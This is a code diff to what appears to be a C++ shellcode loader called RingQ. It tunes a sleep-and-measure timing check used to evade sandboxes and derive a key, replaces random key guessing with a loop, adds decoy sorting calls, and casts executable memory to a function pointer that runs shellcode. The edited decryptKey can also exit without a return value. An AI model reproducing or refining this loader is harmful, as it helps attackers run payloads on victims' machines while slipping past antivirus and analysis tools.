@@ -164,14 +164,16 @@ void quickSort(int arr[], int left, int right) {
 
 int decryptKey(int diff, int minValue, int maxValue) {
 
-    std::random_device rd;
-    std::mt19937 gen(rd());
-    std::uniform_int_distribution<int> dis(minValue, maxValue);
-    int randomValue = diff + dis(gen);
-    if (randomValue == 520520) {
-        return randomValue;
+    for (int num = minValue; num <= maxValue; num++) {
+        generateAndSortArray();
+
+        int randomValue = diff + num;
+
+        if (520519 < randomValue && randomValue < 520521) {
+            return randomValue;
+        }
     }
-    return decryptKey(diff, minValue, maxValue);
+
 }
 
 void banner() {
@@ -224,7 +226,7 @@ void RingQ(const std::string& file_path) {
     input_file.close();
 
     auto start_time = std::chrono::high_resolution_clock::now();
-    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
+    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
     auto end_time = std::chrono::high_resolution_clock::now();
 
     auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);
@@ -236,7 +238,7 @@ void RingQ(const std::string& file_path) {
 
     int i = 300;
     while (i--) {
-        int randomValue = decryptKey(diff, 5000, 5500);
+        int randomValue = decryptKey(diff, 1900, 2200);
 
         if (520519 < randomValue && randomValue < 520521) {
 
@@ -256,6 +258,7 @@ void RingQ(const std::string& file_path) {
 
             typedef void (*ShellcodeFunc)();
 
+            generateAndSortArray();
 
             ShellcodeFunc shellcodeFunc = reinterpret_cast<ShellcodeFunc>(execMemory);
 
